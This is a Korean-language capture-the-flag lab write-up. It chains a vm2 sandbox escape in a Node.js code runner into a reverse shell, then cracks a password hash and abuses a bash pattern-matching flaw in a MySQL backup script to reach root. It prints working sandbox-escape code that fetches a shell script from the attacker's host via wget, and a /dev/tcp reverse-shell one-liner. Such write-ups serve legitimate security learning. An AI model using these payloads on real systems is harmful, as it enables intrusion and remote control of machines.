### 초기
- Node.js code를 온라인에서 실행하는 샌드 박스 프로그램이 있는 것을 확인
- 해당 웹 서버에는 제한 사항이 있음(사용 불가 기능)
  - fs
  - 자식 프로세스

- 3.9.16 이하 버전 vm2 취약점이 있는 것을 알 수 있었다.
- 순서
  - 에러 객체에 오버라이딩 함
  - 에러를 발생시켜 오버라이딩한 내용을 실행
  - access objects created outside the sandbox and execute arbitrary code
- 해당 코드를 사용하여 실행한다.

```
const {VM}=require("vm2");
const vm=new VM();

const code=`
const customInspectSymbol=Symbol.for('nodejs.util.inspect.custom');

obj={

[customInspectSymbol]: (depth, opt, inspect)=>{
inspect.constructor('return process')().mainModule.require('child_process').execSync('wget <내 ip>:80/shell.sh');
}, valueOf: undefined,
constructor: undefined,
}
WebAssembly.compileStreaming(obj).catch(()=>{});
`;
vm.run(code);
```
- execSync('')안에 실행할 코드를 넣는다.
- python3 -m http.server 80 실행 후 wget http://10.10.14.33:80/shell.sh 를 넣어 쉘을 다운로드 시킨다.
### shell.sh에
### #!/bin/bash
### sh -i >& /dev/tcp/10.10.14.33/4444 0>&1 를 넣고 원격으로 실행 시킨다.
- chmod +x shell.sh, ./shell.sh 를 순서대로 넣어 reverse shell을 획득한다.
- 내부에서 얻은 결과
  - joshua 폴더로 이동할 수 없었다.
  - /var/www/contact/tickets.db 파일에서 pw 해시 값을 얻을 수 있었다.
- john pw.txt --wordlist=/usr/share/wordlists/rockyou.txt로 비밀번호 크랙을 시도한다.
- spongebob1 값을 찾았고 이를 사용하여 ssh joshua@10.10.11.239로 접속을 시도한다.
### ssh로 연결 한 후
- sudo -l로 sudo 권한으로 실행할 수 있는 파일인 mysql-backup.sh를 찾을 수 있다.
  - mysql-backup.sh: mysql 백업 스크립트
  - sudo -l: 시스템의 현재 사용자 또는 지정된 사용자에게 부여 된 권한을 나열
- mysql-backup.sh
  - 스크립트 파일안에 pw를 검증하는 코드가 있는데 DB_PASS==USER_PASS에서 USER_PASS가 " " 안에 없을 경우 문자열로 인식하지 않고 pattern matching을 사용한다
  - 한 글자씩 비교하고 정규표현식으로 *를 넣어 패스워드를 비교한다
  - crack1.py를 만들고 python3 crack1.py로 실행하여 pw를 찾는다
  - 찾은 pw로 su root를 실행하여 root.txt를 찾는다
### 결론
- nodejs 코드 실행기에서 샌드박스 이스케이프를 활용하여 코드를 실행
- 취약한 mysql 백업 스크립트에서 root 패스워드 탈취
- bash에서 실행되는 db.sh이므로 brute force에 취약했음
- 웹 앱, db, 스크립트 광범위한 분야에서 보호해야 한다
